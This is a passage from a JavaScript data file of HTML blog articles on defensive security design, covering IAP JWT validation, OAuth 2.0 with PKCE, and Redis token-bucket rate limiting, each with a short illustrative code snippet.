            <p>In a traditional network, hitting an internal IP exposes the service layer. With an IAP (like Cloudflare Access or GCP IAP), the service layer has no public IP and only accepts connections carrying a cryptographically signed JSON Web Token generated by the proxy infrastructure.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-cyan-400">
# Python middleware demonstrating IAP JWT validation
from my_auth import validate_iap_jwt

@app.before_request
def check_iap():
    jwt = request.headers.get("x-goog-iap-jwt-assertion")
    if not jwt:
        abort(401, "No authentication context")
    
    # Must validate signature against Google's public keys
    # AND validate the audience matches this specific application
    user_context = validate_iap_jwt(jwt, expected_audience="app_client_id")
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>If an attacker compromises an employee's laptop, they cannot simply scan the internal network to find and exploit legacy systems, because lateral movement is severely restricted by per-application authentication barriers.</p>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Identity, not the network layer, is the new security perimeter.</li>
                <li>IAP architectures eliminate the need for cumbersome and precarious corporate VPNs.</li>
            </ul>
        `
    },
    {
        id: 'oauth2-pkce-architecture',
        title: 'OAuth 2.0 and PKCE: Securing Authorization Flows in Single Page Apps',
        date: '2025-06-20',
        readTime: '11 min read',
        category: 'System Design',
        color: '#10b981',
        excerpt: 'Understanding the deprecation of the OAuth Implicit Flow and how Proof Key for Code Exchange (PKCE) hardens Single Page Applications against token interception.',
        content: `
            <p class="lead">Modern React, Vue, and Angular applications cannot securely store static client secrets. OAuth 2.0 addressed this via the PKCE extension, revolutionizing auth flow design.</p>
            <h3>Concept Overview</h3>
            <p>Historically, Single Page Applications (SPAs) used the Implicit Flow, which directly passed access tokens in URL hash fragments. If malware on the machine intercepted the URL redirect, the token was stolen. The Authorization Code flow with Proof Key for Code Exchange (PKCE) removes the need for static secrets entirely by using dynamic cryptographic challenges.</p>
            <h3>Technical Breakdown</h3>
            <p>When the SPA initiates login, it generates a random <code>code_verifier</code> and computes its SHA-256 hash (<code>code_challenge</code>). It sends the challenge to the auth server. The auth server returns a temporary <code>code</code>. The SPA then exchanges the <code>code</code> for tokens by proving it owns the original <code>code_verifier</code>.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-green-400">
// Creating the PKCE Verifier and Challenge in JS
const codeVerifier = generateRandomString(64);
const codeChallenge = base64UrlEncode(crypto.subtle.digest("SHA-256", new TextEncoder().encode(codeVerifier)));

// Step 1: Send client_id + code_challenge to Auth Server
// Step 2: Receive short-lived Auth Code
// Step 3: Send Auth Code + original codeVerifier to Token Endpoint
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>Even if a malicious application running on the same device registers a handler for the redirect URI and steals the authorization <code>code</code>, it cannot exchange it for an Access Token because it does not possess the randomly generated <code>code_verifier</code> stored deep within the SPA's memory.</p>
            <h3>Key Takeaways</h3>
            <ul>
                <li>The Implicit Flow is deprecated and considered insecure by current IETF best practices.</li>
                <li>PKCE mathematically guarantees that the client exchanging the token is the exact same one that requested it.</li>
            </ul>
        `
    },
    {
        id: 'rate-limiting-redis-architecture',
        title: 'Rate Limiting Architecture: Combining Redis and Token Buckets at Scale',
        date: '2025-06-01',
        readTime: '12 min read',
        category: 'System Design',
        color: '#8b5cf6',
        excerpt: 'Designing distributed rate limiters to protect APIs against brute-force, scraping, and volumetric DoS attacks utilizing the Token Bucket algorithm.',
        content: `
            <p class="lead">APIs without rate limiting will inevitably succumb to abuse. Designing an efficient distributed rate limiter is a fundamental systems engineering challenge across modern microservices.</p>
            <h3>Concept Overview</h3>
            <p>A Token Bucket algorithm allows for small bursts of traffic while enforcing a strict sustained rate. If a user tries to consume more tokens than currently exist in the bucket, the request is dropped with an HTTP 429 status code.</p>
            <h3>Technical Breakdown</h3>
            <p>Instead of tracking local state in server memory (which fails in load-balanced microservices), state is centralized in an extremely fast Redis cache. To prevent race conditions during distributed reads and writes, we execute the logic atomically via a Redis Lua script.</p>
            <pre class="bg-dark/50 p-4 rounded-lg my-6"><code class="text-sm font-mono text-purple-400">
-- Atomic Redis LUA Script for Token Bucket
local key = KEYS[1]
local rate = tonumber(ARGV[1])
local capacity = tonumber(ARGV[2])
local now = tonumber(ARGV[3])
local requested = tonumber(ARGV[4])

local fill_time = capacity/rate
-- Logic ensures check, calculation, and token deduction 
-- happen instantaneously without async race conditions.
            </code></pre>
            <h3>Impact Analysis</h3>
            <p>By enforcing limits natively at the API Gateway or Edge network layer via Redis integration, backend processing nodes are entirely shielded from brute-force authentication attacks and mass volumetric scrapers.</p>
            <h3>Mitigation / Prevention considerations</h3>
            <ul>
                <li><strong>Granular Rules:</strong> IP limits are insufficient due to NAT/CGNAT. Implement limits per Authentication Token or UserID.</li>
                <li><strong>Graceful Degradation:</strong> If Redis goes down, ensure the application "fails open" slightly rather than locking out the entire platform.</li>
            </ul>
            <h3>Key Takeaways</h3>
            <ul>
                <li>Race conditions break primitive rate limiters.</li>
                <li>Atomic Lua scripts in in-memory databases represent the gold standard for global API synchronization.</li>
            </ul>
        `
    }
];
